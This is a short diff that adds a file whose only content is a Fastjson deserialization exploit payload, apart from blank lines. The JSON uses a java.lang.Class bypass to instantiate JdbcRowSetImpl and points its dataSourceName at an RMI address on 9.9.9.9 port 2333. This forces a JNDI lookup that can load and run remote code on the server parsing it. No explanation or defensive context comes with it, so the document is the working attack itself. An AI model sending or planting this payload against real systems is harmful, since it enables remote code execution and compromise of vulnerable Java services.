@@ -1,0 +1,3 @@
+
+
+{"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://9.9.9.9:2333/Object","autoCommit":true}}
